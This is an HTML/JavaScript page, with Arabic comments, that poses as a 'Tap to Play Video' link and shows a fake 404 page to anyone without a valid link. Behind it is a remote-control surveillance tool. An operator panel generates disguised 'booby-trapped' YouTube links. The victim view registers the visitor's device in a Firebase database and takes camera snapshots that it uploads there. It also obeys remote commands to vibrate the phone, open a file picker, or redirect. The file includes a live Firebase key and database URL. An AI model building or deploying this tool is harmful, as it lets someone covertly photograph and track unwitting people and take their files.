<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>404 Not Found</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #000; }
        body { background: var(--bg); color: #fff; margin: 0; font-family: sans-serif; overflow: hidden; }
        
        /* لوحة التحكم */
        #admin-panel { display: none; padding: 15px; height: 100vh; overflow-y: auto; color: var(--neon); font-family: 'Courier New', monospace; }
        .v-card { border: 1px solid #333; padding: 10px; margin-bottom: 8px; border-radius: 5px; cursor: pointer; }
        .v-card.active { border-color: #fff; background: #111; }
        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; margin-top: 5px; cursor: pointer; font-weight: bold; }
        input { width: 100%; padding: 10px; background: #000; color: var(--neon); border: 1px solid var(--neon); margin-top: 5px; }

        /* واجهة الضحية */
        #vic-panel { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; background: #000; }
        .play-btn { width: 70px; height: 70px; border: 3px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
        .play-btn::after { content: ''; position: absolute; top: 18px; left: 26px; border-left: 25px solid #fff; border-top: 17px solid transparent; border-bottom: 17px solid transparent; }
    </style>
</head>
<body>

<div id="vic-panel">
    <div id="p-scr">
        <div class="play-btn" onclick="startGhost()"></div>
        <p style="margin-top:20px;">Tap to Play Video</p>
    </div>
    <div id="l-scr" style="display:none; text-align:center;">
        <div style="width:40px; height:40px; border:3px solid #333; border-top-color:#fff; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto;"></div>
        <p>Loading Content...</p>
    </div>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <input type="file" id="f-in" style="display:none;" accept="image/*" multiple>
</div>

<div id="admin-panel">
    <h3 style="border-bottom: 1px solid var(--neon);">🕹️ CONTROL CENTER V17</h3>
    <div id="v-list">بانتظار الأجهزة...</div>
    <hr>
    <div id="ctrls">
        <h4>Target: <span id="t-name">None</span></h4>
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
            <button onclick="send('snap')">📸 Snap</button>
            <button onclick="send('vibrate')">📳 Vibrate</button>
            <button onclick="send('pick')">📂 Pick Files</button>
            <button onclick="send('release')" style="background:#030;">🔓 Release</button>
        </div>
        <button onclick="db.ref('/').remove()" style="color:red; border-color:red; margin-top:15px;">🗑️ Clear All Sessions</button>
    </div>
    <hr>
    <h4>مصنع الروابط (تنتهي بعد ساعة):</h4>
    <input type="text" id="target-url" placeholder="رابط يوتيوب">
    <button onclick="gen()">توليد رابط ملغم</button>
    <div id="res" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
</div>

<script>
    const config = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        projectId: "monster-system-7f67e"
    };
    firebase.initializeApp(config);
    const db = firebase.database();
    let selId = null;

    const urlParams = new URLSearchParams(window.location.search);
    const isVictim = urlParams.get('v');
    const isAdmin = urlParams.get('admin');

    // --- المنطق الذكي للفصل ---
    if (isAdmin === "1") {
        // الآدمن يفتح دائماً
        document.getElementById('admin-panel').style.display = 'block';
        runAdmin();
    } else if (isVictim) {
        try {
            const data = JSON.parse(atob(isVictim));
            const diff = Date.now() - data.time;
            if (diff > 3600000) { // مر أكثر من ساعة
                document.body.innerHTML = "<h1 style='color:white; text-align:center; margin-top:45vh;'>404 Not Found</h1>";
            } else {
                document.getElementById('vic-panel').style.display = 'flex';
                runVictim(data.url);
            }
        } catch(e) { document.body.innerHTML = "404 Not Found"; }
    } else {
        document.body.innerHTML = "<h1 style='color:white; text-align:center; margin-top:45vh;'>404 Not Found</h1>";
    }

    // --- الآدمن ---
    function runAdmin() {
        db.ref('victims').on('value', s => {
            const list = document.getElementById('v-list');
            list.innerHTML = '';
            s.forEach(child => {
                const v = child.val(); const id = child.key;
                const active = (Date.now() - v.lastSeen) < 10000;
                list.innerHTML += `<div class="v-card" onclick="sel('${id}','${v.model}')" style="border-color:${id==selId?'#fff':'#333'}">
                    <span style="color:${active?'#0f0':'#f00'}">●</span> ${v.model}
                </div>`;
                if(id === selId && v.files) {
                    // هنا تظهر الصور والملفات المسحوبة (اختياري)
                }
            });
        });
    }
    function sel(id, m) { selId = id; document.getElementById('t-name').innerText = m; }
    function send(t) { if(selId) db.ref('victims/'+selId+'/cmd').set({ t, time: Date.now() }); }
    function gen() {
        const url = document.getElementById('target-url').value;
        const payload = btoa(JSON.stringify({ url: url, time: Date.now() }));
        document.getElementById('res').innerText = window.location.href.split('?')[0] + "?v=" + payload;
    }

    // --- الضحية ---
    let myRef = null;
    function runVictim(target) {
        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2] : "Mobile";
        myRef = db.ref('victims').push();
        myRef.set({ model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
        setInterval(() => myRef.update({ lastSeen: Date.now() }), 5000);

        db.ref('victims/' + myRef.key + '/cmd').on('value', s => {
            const c = s.val(); if(!c) return;
            if(c.t === 'snap') take();
            if(c.t === 'vibrate') navigator.vibrate([300,100,300]);
            if(c.t === 'pick') document.getElementById('f-in').click();
            if(c.t === 'release') window.location.href = target;
        });
    }

    async function startGhost() {
        document.getElementById('p-scr').style.display = 'none';
        document.getElementById('l-scr').style.display = 'block';
        navigator.vibrate(100);
        take();
    }

    async function take() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video:true});
            const video = document.getElementById('v'); video.srcObject = s; await video.play();
            const canvas = document.getElementById('c'); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            myRef.child('files').push(canvas.toDataURL('image/jpeg', 0.5));
            s.getTracks().forEach(t => t.stop());
        } catch(e) {}
    }
</script>
<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
</body>
</html>
